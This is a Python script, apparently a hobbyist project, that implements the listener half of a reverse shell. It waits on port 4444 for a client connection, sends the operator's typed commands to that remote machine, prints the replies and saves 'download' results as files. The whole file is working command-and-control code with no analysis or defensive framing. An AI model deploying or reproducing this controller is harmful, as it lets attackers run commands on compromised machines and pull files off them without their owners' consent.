#!/usr/bin/python
# General - Connection to the client, able to send and recieve data. Testing on port 4444.
# General - json is used to manage serilisation to receive large data.


import socket
import json
import base64


class Listr:
    def __init__(self, addr, prt):
        listr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # The bellow is to reuse a connection if it doesn't go down with the connection to.
        listr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print(addr)
        listr.bind((addr, prt))
        listr.listen(0)
        print("Connecting...") #testing
        self.conn, self.addrs = listr.accept()
        print("\nConnected to " + str(self.addrs) + "\n") #testing

    def send_data(self, data):
#        print("\ntype: " + str(type(data)) + " - data: " + str(data) + "\n") #testing
        json_data = json.dumps(data)
#        print("\ntype: " + str(type(json_data)) + " - json_data: " + json_data + "\n") #testing
        self.conn.sendall(json_data.encode())

    def rcve_data(self):
        json_data = ""
        while True:
            try:
#                print("exit 0") #testing
                json_data += self.conn.recv(1024).decode() # plus sign is necessary.
                if json_data == "" or json_data == b'':
 #                   print("break: " + str(json_data)) #testing
                    break
 #               print("exit 1" + " - json_data: " + str(json_data)) #testing
                return json.loads(json_data)
            except ValueError:               
                continue

    def exe_rmy(self, comm):
        self.send_data(comm)
        return self.rcve_data()

    def w_f(self, path, item):
        with open(path, "wb") as f:
            f.write(base64.b64decode(item))
            return "\nDownloaded"

    def run(self):
        while True:
            try:
                comm = input(f"({self.addrs}) $ ").split(" ")
                result = self.exe_rmy(comm)
                while result == None:
                    result = self.exe_rmy(comm)
                if comm[0] == "download":
                    result = self.w_f(comm[1], result.encode())
                print(result)
                # if "exit" in comm:
                #     self.send_data("test...")
            except (BrokenPipeError, ConnectionAbortedError) as cnerr:
                print(cnerr.strerror + " - Connection down")
                self.conn.close()
                exit()
        

my_listner = Listr('', 4444)
my_listner.run()